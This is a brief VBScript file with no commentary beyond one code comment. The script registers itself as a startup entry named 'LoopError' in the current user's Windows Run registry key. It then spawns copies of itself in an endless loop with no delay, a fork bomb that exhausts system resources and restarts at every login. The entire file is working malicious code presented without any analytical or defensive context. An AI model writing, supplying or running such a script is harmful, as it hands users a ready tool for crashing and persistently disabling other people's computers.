Dim objShell, objFSO, scriptPath, regKey

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

scriptPath = objFSO.GetAbsolutePathName(WScript.ScriptFullName)
regKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\LoopError"

' Add the script path to the registry as a startup key
objShell.RegWrite regKey, scriptPath, "REG_SZ"

Do
    objShell.Run "wscript.exe " & scriptPath, 1, False
    
    WScript.Sleep 0
Loop
